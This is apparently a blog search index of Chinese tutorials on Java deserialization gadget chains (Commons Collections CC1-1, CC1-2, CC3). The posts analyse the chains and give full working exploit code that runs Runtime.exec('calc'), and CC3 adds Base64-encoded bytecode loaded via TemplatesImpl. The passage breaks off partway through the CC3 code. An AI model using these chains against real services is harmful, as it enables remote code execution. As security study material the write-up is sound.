<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1、CC1-1</title>
    <url>/2023/08/22/1%E3%80%81CC1-1/</url>
    <content><![CDATA[
# CC1-1
## 简述
Apache Commons Collections 中提供了一个 Transformer 的类，这个接口的功能就是将一个对象转换为另外一个对象，CC 链都依赖于此。
## 利用版本
jdk8u71 以前（8u71 开始往后已修复不可利用）&& Commons-Collections 3.1-3.2.1
## 原理
主要问题还是出现在Transformer接口的各个实现类中
## CC1-1 Demo
这里直接上前辈的demo
```

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("xxdf", "xxxx");
    }
}
```
效果：

![](https://s3.hedgedoc.org/demo/uploads/39b604b4-e1d8-4feb-ba4d-2afda20187aa.png)

下面就根据Demo分析一下
### Transformer实现类分析
#### ConstantTransformer
实现了Transformer、Serializable两条接口

![](https://s3.hedgedoc.org/demo/uploads/cacf5d87-195d-4c4f-a960-d80f7d8d6ad2.png)

重写了Transformer.transform()方法，作用是不论输入什么对象，都输出iConstant这个成员变量的值

![](https://s3.hedgedoc.org/demo/uploads/29503fe1-dba7-407b-a27a-8bcd4a848feb.png)

成员变量iConstant的值可控，可通过实例化ConstantTransformer对象进行赋值；构造方法为public所修饰，可以直接new或者调用getInstance()方法实例化

![](https://s3.hedgedoc.org/demo/uploads/717aa42b-d15a-4669-b1e1-7135e80f976b.png)

#### InvokerTransformer
实现了Transformer、Serializable两条接口

![](https://s3.hedgedoc.org/demo/uploads/a443741f-86b4-4659-9f4d-236c9634cd87.png)

重写了Transformer.transform()方法，作用是传入一个对象，然后调用对象中指定的方法，但是需要方法的方法名（iMethodName）、参数类型（iParamTypes），参数值（iArgs）

![](https://s3.hedgedoc.org/demo/uploads/20d27c6e-3c3e-4d24-8268-9e1884d81f47.png)

不过这三个都可以通过构造方法实例化时候传入赋值

![](https://s3.hedgedoc.org/demo/uploads/e92d13b5-58ac-4a4b-8f3b-cb7d59de75dc.png)

#### ChainedTransformer
实现了Transformer、Serializable两条接口

![](https://s3.hedgedoc.org/demo/uploads/d2f32437-24dc-4612-9cc4-c61823fec322.png)

重写了Transformer.transform()方法，作用是传入一个对象，循环调用Transformer[]对象中的每一个Transformer.transform()方法，且前一个对象（传入的对象）是后一个对象的参数，最后输出结果对象

![](https://s3.hedgedoc.org/demo/uploads/50bee9df-d137-4b5e-a6a2-4639cba2a87e.png)

上面的话看起来可能有点难抽象理解啊，我们写个测试代码

```
public class Test {

    private final int[] iTransformers = {1,2,3,4,5};
    public int transform(int num1) {
        for(int i = 0; i < iTransformers.length; i++) {
            num1 = num1 + i;
        }
        return num1;
    }

    public static void main(String[] args) {
        Test test = new Test();
        int num = test.transform(6);
        System.out.println(num);
    }
}
```

只是把循环调用Transformer.transform()方法改成了循环调用num1 + 1而已，这个把参数带入一下就好理解了
#### TransformedMap
继承AbstractInputCheckedMapDecorator类，实现了Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/77a99386-8e67-44cf-a415-d4f80b64da3f.png)

往上回溯父类，其实也实现了Map接口

![](https://s3.hedgedoc.org/demo/uploads/8d04eee1-3822-4864-8485-83b880307c68.png)

![](https://s3.hedgedoc.org/demo/uploads/cfabdf8b-0ae9-4e65-a21f-e12dfecaddd3.png)

构造方法为protected所修饰，不同包的类无法通过new进行实例化

![](https://s3.hedgedoc.org/demo/uploads/1d285b29-61ee-4ee3-8ffb-dc6486eeb61c.png)

不过可以通过静态方法decorate进行实例化

![](https://s3.hedgedoc.org/demo/uploads/fa493e57-232a-4f34-861f-6d303ef13ec5.png)
### 整体分析
回到demo中，触发计算器的点在TransformedMap.put("xxdf", "xxxx")中（你不信把outerMap.put("xxdf", "xxxx")删了看看还弹不弹计算器），我们直接跟进TransformedMap.put()

![](https://s3.hedgedoc.org/demo/uploads/24513aae-afb5-4455-88fe-d763af72ddff.png)

调用了transformKey()和transformValue()两个方法，继续跟进

![](https://s3.hedgedoc.org/demo/uploads/792d375c-6586-4f39-8964-f8c43c0a48f6.png)

![](https://s3.hedgedoc.org/demo/uploads/3874d4dc-1a40-4ad6-92ae-0e52ce444eac.png)

都调用了transform()方法，而keyTransformer和valueTransformer这两个成员变量其实都是Transformer对象

![](https://s3.hedgedoc.org/demo/uploads/51cc4b28-05cb-4dbd-b018-e31d0af17784.png)

所以到这儿就破案了，只要调用put方法就能触发Transformer.transformer()

我们再回到TransformedMap.decorate()方法，调用这个方法实例化的TransformedMap对象其实也是Map对象

现在，就需要找一个实现了Serializable接口的类，并在重写的readObject()方法的中调用了Map.put()方法

这样，就能在反序列化的时候直接调用TransformedMap.put()方法

### 序列化实现
最终，前辈们找到了sun.reflect.annotation.AnnotationInvocationHandler类，我们跟进
AnnotationInvocationHandler实现了Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/55d922a7-447b-4900-b154-e77779eade02.png)

并重写了readObject()方法，稍微分析一下

![](https://s3.hedgedoc.org/demo/uploads/4f4c2db6-0672-49f6-aca7-7dcb453a8ca5.png)

1. 获取memberValues这个成员变量中的键值对条目的集合，然后放在迭代器上，最后赋值给var4
2. 判断var7是否为null，如果不为null，则进入下面的代码逻辑
3. 判断var8是否不为var7的实例对象，并且判断var8是否不为ExceptionProxy的子类或者对象，如果同时满足这两个条件则进入下面的代码逻辑
4. 最后调用var5.setValue（var5为Map对象），间接触发Map.put()方法

333行中的memberValues这个成员变量，是Map对象，是在AnnotationInvocationHandler类实例化的时候赋值的，需要传入一个Annotation接口的实现对象和一个Map对象

![](https://s3.hedgedoc.org/demo/uploads/09f65eb4-00bb-4511-8322-f34ade0ec4a1.png)

Annotation接口的实现对象好找啊，直接选中Annotation接口然后Ctrl + H查看

![](https://s3.hedgedoc.org/demo/uploads/7585eb42-5e07-4033-bc06-3142e1b1812f.png)

一堆，我们也不挑，这里直接用第一个NamedArg

需要的Map对象也好办，就是上面的TransformedMap类

所以就简单了，我们直接在上面的demo的继承上改进

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javafx.beans.NamedArg;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //获取AnnotationInvocationHandler对象
        Class classz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = classz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(NamedArg.class, outerMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(o);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();
    }
}

```
效果：

![](https://s3.hedgedoc.org/demo/uploads/30ee9195-1060-44ab-93c4-244c3a234bd1.png)

出现了问题，是序列化时候出现问题，原因是Runtime对象并没有实现Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/33b1ccfb-b4f3-4a9f-aedf-116f67543e0a.png)

但是Class对象实现了Serializable接口，我们可以从Runtime.class中获取Runtime对象

![](https://s3.hedgedoc.org/demo/uploads/a204238d-071e-4234-a654-dcbe78566bc2.png)

修改代码如下：
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javafx.beans.NamedArg;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                //从Runtime.class中获取Runtime对象
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //获取AnnotationInvocationHandler对象
        Class classz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = classz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(NamedArg.class, outerMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(o);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();
    }
}
```
效果：

![](https://s3.hedgedoc.org/demo/uploads/55d6d47f-a0f6-4785-a7bf-1190e925fc10.png)

并没有弹出计算器

我操？

既然没有弹计算器，那就是反序列化的那一步出了问题，直接在AnnotationInvocationHandler.readObject()方法那里打一个断点，调试一下

![](https://s3.hedgedoc.org/demo/uploads/a2c5dcb4-80b2-4b29-9326-bdfcd4430346.png)

![](https://s3.hedgedoc.org/demo/uploads/acc22d1f-b8de-4621-a146-d4395c9ea504.png)

这里成员变量memberValues没有被赋值（size=0）

那就是AnnotationInvocationHandler在实例化的时候的问题，再在AnnotationInvocationHandler的构造方法打个断点调试看看

![](https://s3.hedgedoc.org/demo/uploads/37fe7d6c-0af0-4179-ab0c-25b9c6d5173b.png)

Annotation的实现类没有问题，问题出在var2上面

var2就是我们传入的TransformedMap类，但是这里显示size=0，说明没有键值，自然而然赋不了值，所以需要赋值，这里我们随便赋值意思意思

![](https://s3.hedgedoc.org/demo/uploads/4a0ca52a-da7e-4c99-8533-c0b5e79aa629.png)

再调试

![](https://s3.hedgedoc.org/demo/uploads/9901dd74-22ac-4008-a09b-081f599ce0f8.png)

欧克，可以了

但是调试进入到readObject的代码逻辑的时候，又出问题了

![](https://s3.hedgedoc.org/demo/uploads/c378c88f-d240-4755-b543-22d44ef5569a.png)

此时的var7的值为null，但是这样进不去下面的var5.setValue()了呀！那还搞个屁，所以还是得分析一下上面的代码

![](https://s3.hedgedoc.org/demo/uploads/22e85c5b-1287-44b1-b8d5-ceb398eeb70e.png)

var7来自于var3，var3是个Map对象，查看var3

![](https://s3.hedgedoc.org/demo/uploads/d6291150-d610-4aac-86d0-366111a41e10.png)

此时的var3的有两个键值，一个是"value":"class java.lang.String"，一个是"defaultValue":"class java.lang.String"

有没有觉得很眼熟，这不就是传进入的NamedArg接口的两个方法吗？！

键就是方法名，值就是方法的返回值

![](https://s3.hedgedoc.org/demo/uploads/e5b88376-0cea-4804-9672-8f49794073f4.png)

回到反序列化代码

![](https://s3.hedgedoc.org/demo/uploads/cc7e92e4-3239-41de-9760-e607dbe3c0a8.png)

var7定义的那一行代码中，get()方法的作用是根据键取值，而我们var3的键为"value"和"defaultValue"，这里传入的键为"111"，var3里面根本没有111这个键，结果当然是null

这里写一个测试代码：
```
import java.util.HashMap;
import java.util.Map;

public class test {
    public static void main(String[] args) {
        Map var3 = new HashMap<>();
        var3.put("value",String.class);
        var3.put("defaultValue",String.class);
        Class o = (Class) var3.get("111");
        System.out.println(o);
    }
}

```
![](https://s3.hedgedoc.org/demo/uploads/157bf4ab-53fd-4ade-a038-11ec3d271f73.png)

所以，"111"来自哪里？向上分析，其实就来自于TransformedMap类，在上面我们给它的赋值

我们将"111"改为"value"，然后调试

![](https://s3.hedgedoc.org/demo/uploads/a0689014-5e76-4906-823c-482c7830dc37.png)

![](https://s3.hedgedoc.org/demo/uploads/0d5c3530-0884-48cf-946a-05d320e46f9f.png)

很好，var7不为空，var7值是"class java.lang.String"了，我们继续调试，顺利进入到下面的代码逻辑

不过又出问题了，根据下面代码逻辑，必须满足下面if语句中的两个代码逻辑才可以进入var5.setValue()，此时的var8是"222"，是var7的值 class java.lang.String的实例对象，所以不会进入var5.setValue()

![](https://s3.hedgedoc.org/demo/uploads/fa6022e0-3b63-423f-97dc-da86fca5fa09.png)

也就是说，var8或者var7需要改下才可以进入到下面的var.setValue
1. 要么var8不为class java.lang.String的实例对象
2. 要么var7不为class java.lang.String

### 修改var8
这里的var8为"222"，其实就是我们设定的TransformedMap的值

![](https://s3.hedgedoc.org/demo/uploads/b44a421d-0756-4408-9d76-08ed39e1f365.png)

我们给它改成数字111，这样var8就不是class java.lang.String的实例对象了，最后我们修改后直接运行

![](https://s3.hedgedoc.org/demo/uploads/6cb084ab-a948-472a-8631-8bebca496581.png)

很好，直接弹出计算器
### 修改var7
上面说到，var7来自于var3的键与值中的值的Class对象，var3其实就是获取到AnnotationInvocationHandler实例对象时候，我们传入的Annotation的实现类（这里我们传入的是NamedArg接口）中的方法和(Class)返回值

![](https://s3.hedgedoc.org/demo/uploads/f13c9658-3c6d-4dcd-a2c7-1d0200f91236.png)

![](https://s3.hedgedoc.org/demo/uploads/63478ca5-0c75-4612-92b3-4aaa7c1b1b71.png)

而我们传入的TransformedMap类的键其实就是var3的键

![](https://s3.hedgedoc.org/demo/uploads/2628678a-fa05-4816-9671-e8cabdcb0fc2.png)

所有要改var7，就只有换一个Annotation的实现类，这里我们选Addressing，它三个方法的(class)返回值都不是java.lang.String，所以随便哪个方法都可以，这里我们选required

![](https://s3.hedgedoc.org/demo/uploads/3d5dab3c-1d52-419a-b077-61492ba93a1b.png)

这里我们将传入的Annotation的实现类改为Addressing，TransformedMap的键改为"required"，最后运行

![](https://s3.hedgedoc.org/demo/uploads/e794025c-c2bd-43bf-8f06-e4fbf6fae44b.png)

弹出计算器，结束

## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javafx.beans.NamedArg;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                //从Runtime.class中获取Runtime对象
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value",111);
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //获取AnnotationInvocationHandler对象
        Class classz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = classz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(NamedArg.class, outerMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(o);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();
    }
}

```

## 学习
https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#0x02-P%E7%89%9B%E7%AE%80%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BEDemo%E5%88%86%E6%9E%90

https://xz.aliyun.com/t/9409


]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>2、CC1-2</title>
    <url>/2023/08/22/2%E3%80%81CC1-2/</url>
    <content><![CDATA[
# CC1-2
## 简述
此链是在CC1-1的基础上进行分析与修改
## 前置知识
{% post_link 动态代理 %}
## 利用版本
jdk8u71 以前（8u71 开始往后已修复不可利用）&& Commons-Collections 3.1-3.2.1
## CC1-2 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_2 {

    public static void main(String[] args) throws Exception{

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //反射获取AnnotationInvocationHandler实例
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        //动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke           
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(handler1);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 分析
直接看demo

![](https://s3.hedgedoc.org/demo/uploads/5b7e4275-3207-498f-9532-41b5e0af79bf.png)

可以看出，cc1-2用了动态代理，而被代理的类，就是sun.reflect.annotation.AnnotationInvocationHandler

我们分析一波sun.reflect.annotation.AnnotationInvocationHandler，它实现了InvocationHandler接口

![](https://s3.hedgedoc.org/demo/uploads/b07978de-eb33-4be5-b856-b10b26689267.png)

重写了invoke()方法，并在第59行调用了this.memberValues.get(var4)

![](https://s3.hedgedoc.org/demo/uploads/1ddca427-bb59-4b09-b7ff-4d30470bfcb8.png)

成员变量memberValues是一个Map对象，通过构造方法赋值

![](https://s3.hedgedoc.org/demo/uploads/b9bf03ae-2748-46d8-83d0-2b47a99c5083.png)

总的来说，AnnotationInvocationHandler的代理类在反序列化的时候必定会调用了AnnotationInvocationHandler.invoke()方法，进而调用Map.get()方法

继续分析，成员变量memberValues被赋予的值其实是LazyMap对象，这就说明，在反序列化的时候，就会调用LazyMap.get()方法，我们跟进LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/136c59e1-5204-4334-b7cb-8b44381817cd.png)

LazyMap.get()方法中，成员变量factory其实就是Transformer对象

![](https://s3.hedgedoc.org/demo/uploads/bca218a8-f319-4657-9427-71fd31a3635b.png)

而LazyMap.decorate()方法其实和cc1中的TransformedMap.decorate()是异曲同工之妙，都是将Transformer对象转化成Map对象

再往上面看，其实代码都一样

![](https://s3.hedgedoc.org/demo/uploads/781a96de-e907-485a-80f3-afaa43fa2b3e.png)

![](https://s3.hedgedoc.org/demo/uploads/c45ff784-0aa2-4609-b8f2-5391f4d6e10a.png)

所以cc1-2和cc1-1的相差不大

## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_2 {

    public static void main(String[] args) throws Exception{

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //反射获取AnnotationInvocationHandler实例
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        //动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke
        Map mapProxy = (Map) Proxy.newProxyInstance(
                LazyMap.class.getClassLoader(),
                LazyMap.class.getInterfaces(),
                handler);

        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(handler1);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```

## 总结
cc1-1通过 AnnotationInvocationHandler 类触发 TransformedMap 的 put 方法

![](https://s3.hedgedoc.org/demo/uploads/f3e0523f-f228-4f93-a9b3-de99c566e3cc.png)

而cc1-2则是通过通过 AnnotationInvocationHandler 类触发 LazyMap 的 get 方法

![](https://s3.hedgedoc.org/demo/uploads/6df76d17-db3d-442c-96e7-37fdf59c309a.png)

## 学习
https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#0x02-P%E7%89%9B%E7%AE%80%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BEDemo%E5%88%86%E6%9E%90

https://xz.aliyun.com/t/9409












]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>3、CC3</title>
    <url>/2023/08/22/3%E3%80%81CC3/</url>
    <content><![CDATA[# CC3
## 前置知识
{% post_link TemplatesImpl %}

{% post_link 动态代理 %}
## 利用版本
jdk8u71 以前（8u71 开始往后已修复不可利用，这里用的是jdk8u66）&& Commons-Collections 3.1-3.2.1
## CC3 Demo
```
public class CommonsCollections3 {

    public static void main(String[] args) {

        try{
            //字节码
            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };

            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            //LazyMap实例
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

            //反射获取AnnotationInvocationHandler实例
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

